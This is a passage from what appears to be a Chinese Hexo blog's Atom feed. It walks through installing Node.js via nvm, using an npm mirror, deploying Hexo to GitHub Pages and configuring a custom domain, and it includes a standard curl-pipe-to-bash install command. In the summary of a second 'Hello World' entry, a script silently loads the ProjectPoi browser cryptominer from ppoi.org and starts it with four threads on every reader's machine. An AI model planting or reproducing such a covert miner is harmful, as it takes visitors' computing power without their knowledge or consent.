authenticated, but GitHub does not provide shell access.</div></pre></td></tr></table></figure><h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.0/install.sh | bash`</div></pre></td></tr></table></figure><p>然后，将以下代码添加至到profile(<code>~/.bash_profile</code>， <code>~/.zshrc</code>， <code>~/.profile</code>， <code>~/.bashrc</code>其中之一)文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">export NVM_DIR=&quot;$HOME/.nvm&quot;</div><div class="line">[ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; . &quot;$NVM_DIR/nvm.sh&quot;</div></pre></td></tr></table></figure></p><p>重启终端，输入以下指令安装node最新的LTS版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nvm install --lts=boron</div></pre></td></tr></table></figure><h3 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h3><p>Node.js默认是通过npm进行包管理的，但npm官方源在国内速度那可叫一个酸爽，而且还经常抽疯，原因大家都懂的，如果没有好梯子，建议大家使用<a href="https://npm.taobao.org/" target="_blank" rel="external">淘宝npm镜像</a>，方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</div></pre></td></tr></table></figure><p>安装成功后，就可以能过以下指令加速安装相用包啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cnpm install [PackageName]</div></pre></td></tr></table></figure></p><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><h4 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h4><p>安装好Node.js环境后，就可以通过node的npm包管理工具安装Hexo，执行以下指令(当然cnpm可以换成npm，这里使用淘宝加速)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cnpm install hexo-cli -g</div></pre></td></tr></table></figure><blockquote><p>hexo全局安装一次就够了，后面可以直接使用hexo相关的操作。</p></blockquote><h4 id="创建博客文件夹"><a href="#创建博客文件夹" class="headerlink" title="创建博客文件夹"></a>创建博客文件夹</h4><blockquote><p>在此目录下管理自己的博客源码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir blog</div><div class="line"></div><div class="line">cd blog</div></pre></td></tr></table></figure><h4 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo init</div></pre></td></tr></table></figure><h4 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cnpm install</div></pre></td></tr></table></figure><h4 id="生成静态页面"><a href="#生成静态页面" class="headerlink" title="生成静态页面"></a>生成静态页面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo g</div></pre></td></tr></table></figure><h4 id="启动本地服务器"><a href="#启动本地服务器" class="headerlink" title="启动本地服务器"></a>启动本地服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo s</div></pre></td></tr></table></figure><blockquote><p>上面2条命令也可以结合为<code>hexo s -g</code></p></blockquote><p>出现以下内容则说明hexo环境安装成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">INFO  Start processing</div><div class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</div></pre></td></tr></table></figure></p><h2 id="部署Hexo"><a href="#部署Hexo" class="headerlink" title="部署Hexo"></a>部署Hexo</h2><h4 id="1-编辑配置文件，关闭远程仓库"><a href="#1-编辑配置文件，关闭远程仓库" class="headerlink" title="1.编辑配置文件，关闭远程仓库"></a>1.编辑配置文件，关闭远程仓库</h4><p>编辑<code>_config.yml</code>,找到最后的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">## Docs: https://hexo.io/docs/deployment.html</div><div class="line">deploy:</div><div class="line">  type:</div></pre></td></tr></table></figure></p><p>添加GitHub仓库信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># Deployment</div><div class="line">## Docs: https://hexo.io/docs/deployment.html</div><div class="line">deploy:</div><div class="line">  type:  git</div><div class="line">  repo:  git@github.com:damit5/damit5.github.io.git</div><div class="line">  branch:  master</div></pre></td></tr></table></figure><blockquote><p>PS: type、repo、branch的前面和后面都有2个空格</p></blockquote><h4 id="2-安装git插件"><a href="#2-安装git插件" class="headerlink" title="2.安装git插件"></a>2.安装git插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cnpm install hexo-deployer-git --save</div></pre></td></tr></table></figure><h4 id="3-部署"><a href="#3-部署" class="headerlink" title="3.部署"></a>3.部署</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo deploy</div></pre></td></tr></table></figure><p>如果没有意外，部署就成功了，可以打开 https://&lt;用户名&gt;.github.io 查看。</p><p>比如我的就是 : <a href="https://damit5.github.io/" target="_blank" rel="external">https://damit5.github.io/</a></p><hr><h2 id="域名配置"><a href="#域名配置" class="headerlink" title="域名配置"></a>域名配置</h2><p>现在已经可以通过 <a href="https://yourname.github.io" target="_blank" rel="external">https://yourname.github.io</a> 来访问自己的博客站点啦。这时可能有人会说了，大家都通过github.io来访问，好没个性，能不能配置用自己的域名来访问自己的站点。答案当然可以。</p><p>首先，你得有个自己的域名，如果还没，那就去买个。</p><h4 id="1-进域名控制台"><a href="#1-进域名控制台" class="headerlink" title="1.进域名控制台"></a>1.进域名控制台</h4><p>在解析里面添加一条<strong>CNAME</strong>记录，指向yourname.github.io即可。</p><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/RxFprVpwLiDZ*4kAXXIhVwk7WNHfQlI3fRgcmtxJ6N0!/r/dD0BAAAAAAAA" alt="3"></p><h4 id="2-打开项目，选择-setting"><a href="#2-打开项目，选择-setting" class="headerlink" title="2.打开项目，选择 setting"></a>2.打开项目，选择 setting</h4><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/JX0zcsxH*PLMvGpISjWLBOEOEbL6NhU6ufCEwsIFw*U!/r/dPcAAAAAAAAA" alt="4"></p><h4 id="3-找到GitHub-Pages-（每次deploy过后都需要修改一次）"><a href="#3-找到GitHub-Pages-（每次deploy过后都需要修改一次）" class="headerlink" title="3.找到GitHub Pages （每次deploy过后都需要修改一次）"></a>3.找到GitHub Pages （每次deploy过后都需要修改一次）</h4><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/iIOHe4CE4zSqPnERwhbTvYpeUB5qdl6*ee9N0xkrbxA!/r/dLMAAAAAAAAA" alt="5"></p><p>这样就可以通过自己的域名来访问了</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">hexo new&quot;postName&quot;      #新建文章</div><div class="line">hexo new page&quot;pageName&quot; #新建页面</div><div class="line">hexo generate           #生成静态页面至public目录</div><div class="line">hexo clean              #清除生成内容</div><div class="line">hexo server             #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</div><div class="line">hexo deploy             #将.deploy目录部署到指定空间</div><div class="line">hexo help               # 查看帮助</div><div class="line">hexo version            #查看Hexo的版本</div></pre></td></tr></table></figure><h3 id="hexo-命令缩写"><a href="#hexo-命令缩写" class="headerlink" title="hexo 命令缩写"></a>hexo 命令缩写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">hexo g：hexo generate</div><div class="line">hexo c：hexo clean</div><div class="line">hexo s：hexo server</div><div class="line">hexo d：hexo deploy</div></pre></td></tr></table></figure><h3 id="hexo-命令组合"><a href="#hexo-命令组合" class="headerlink" title="hexo 命令组合"></a>hexo 命令组合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo clean &amp;&amp; hexo g -s #清除、生成、启动</div><div class="line">hexo clean &amp;&amp; hexo g -d #清除、生成、部署</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nvm install --lts=boron</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer0&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer0&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;http://damit5.kiwi/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;经过一天的努力博客终于完全完全移植了过来，听说第一篇 &lt;strong&gt;Hello World&lt;/strong&gt; 是惯例，也许就是因为以前没有遵守这个惯例所以博客老GG，不管怎么样，还是写一个吧&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Hello World&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="其他" scheme="http://damit5.ml/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
</feed>
